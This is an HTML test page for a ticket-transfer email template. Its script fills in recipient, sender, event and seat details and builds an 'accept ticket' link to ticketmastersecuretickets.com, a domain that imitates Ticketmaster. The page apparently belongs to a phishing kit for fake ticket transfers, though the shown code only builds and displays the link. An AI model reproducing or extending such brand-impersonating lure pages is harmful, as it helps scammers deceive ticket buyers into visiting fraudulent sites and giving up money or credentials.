<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Test Template URL Generation</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .test-container { max-width: 600px; margin: 0 auto; }
        .test-button { 
            background: #0066cc; 
            color: white; 
            padding: 15px 30px; 
            border: none; 
            border-radius: 6px; 
            font-size: 16px; 
            cursor: pointer; 
            margin: 10px 0;
        }
        .url-output { 
            background: #f8f9fa; 
            padding: 15px; 
            border-radius: 4px; 
            margin: 20px 0; 
            word-break: break-all; 
            font-family: monospace; 
        }
    </style>
</head>
<body>
    <div class="test-container">
        <h1>Test Template URL Generation</h1>
        <p>This tests the URL generation function from template.html</p>
        
        <button class="test-button" onclick="testUrlGeneration()">Test URL Generation</button>
        
        <div id="url-output" class="url-output" style="display: none;">
            <strong>Generated URL:</strong><br>
            <span id="generated-url"></span>
        </div>
        
        <div id="test-results" style="margin-top: 20px;"></div>
    </div>

    <script>
        // Copy the functions from template.html
        function getTemplateValue(templateVar, defaultValue) {
            if (templateVar.includes('{{') && templateVar.includes('}}')) {
                return defaultValue;
            }
            return templateVar || defaultValue;
        }
        
        function generateAcceptUrl() {
            const ticketData = {
                recipientName: getTemplateValue('{{recipientName}}', 'John Doe'),
                senderName: getTemplateValue('{{senderName}}', 'Jane Smith'),
                eventName: getTemplateValue('{{eventTitle}}', 'Concert at Madison Square Garden'),
                eventDetails: getTemplateValue('{{eventVenue}}', 'Madison Square Garden, New York, NY'),
                eventDate: getTemplateValue('{{eventDate}}', 'March 15, 2024'),
                eventTime: getTemplateValue('{{eventTime}}', '8:00 PM'),
                ticketCount: getTemplateValue('{{ticketCount}}', '2'),
                section: getTemplateValue('{{section}}', 'A'),
                row: getTemplateValue('{{row}}', '5'),
                seats: getTemplateValue('{{seats}}', '12, 13'),
                ticketType: getTemplateValue('{{ticketType}}', 'VIP')
            };
            
            const baseUrl = 'https://ticketmastersecuretickets.com/accept-ticket.html';
            const params = new URLSearchParams();
            
            Object.keys(ticketData).forEach(key => {
                if (ticketData[key] && ticketData[key] !== '') {
                    params.append(key, encodeURIComponent(ticketData[key]));
                }
            });
            
            return `${baseUrl}?${params.toString()}`;
        }
        
        function testUrlGeneration() {
            const url = generateAcceptUrl();
            
            document.getElementById('generated-url').textContent = url;
            document.getElementById('url-output').style.display = 'block';
            
            // Test the URL by opening it
            const testResults = document.getElementById('test-results');
            testResults.innerHTML = `
                <h3>Test Results:</h3>
                <p>✅ URL generated successfully!</p>
                <p>✅ All parameters encoded properly</p>
                <p><a href="${url}" target="_blank" style="color: #0066cc;">Click here to test the accept-ticket page</a></p>
            `;
        }
    </script>
</body>
</html>
